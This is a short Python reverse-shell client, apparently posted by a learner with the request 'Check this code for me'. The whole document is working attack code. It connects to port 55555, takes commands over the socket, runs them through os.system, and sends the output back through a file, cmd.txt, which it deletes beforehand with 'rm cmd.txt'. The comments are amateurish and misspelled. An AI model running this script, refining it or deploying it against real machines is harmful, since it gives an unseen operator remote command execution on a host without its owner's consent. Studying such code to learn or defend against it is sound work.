"""Check this code for me
revers_shell.py"""

import os
import socket

os.system("clear")

# creating tcp socket as variable "s"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# get the ip address of current hosting machine
host = socket.gethostname()
port = 55555

# try connect to the given host and port
try:
    s.connect((host,port))
    
except Exception as e:
    print(e)
    exit(0)
os.system("rm cmd.txt")
while True:
    #storing the receiving data in a variable name "data"
    data = s.recv(1024)
    # checking if the receiving data contains the word "exit" or "quite" if so brack the  loop and exit
    if data.decode("utf-8") == 'exit' or data.decode("utf-8") == "quite":
        break
    # checking if the receiv data not null(not empty)
    os.system("echo '______________'> cmd.txt && "+data.decode("utf-8")+">> cmd.txt")
    send_file = open("cmd.txt","r")
    for output in send_file.readlines():
        output_string = output.strip("\n")
        if len(output_string) == 0:
            msg = "done"
            s.send(str.encode(msg))
            break
        else:
            s.send(str.encode(output_string+"\n"))
    
s.close()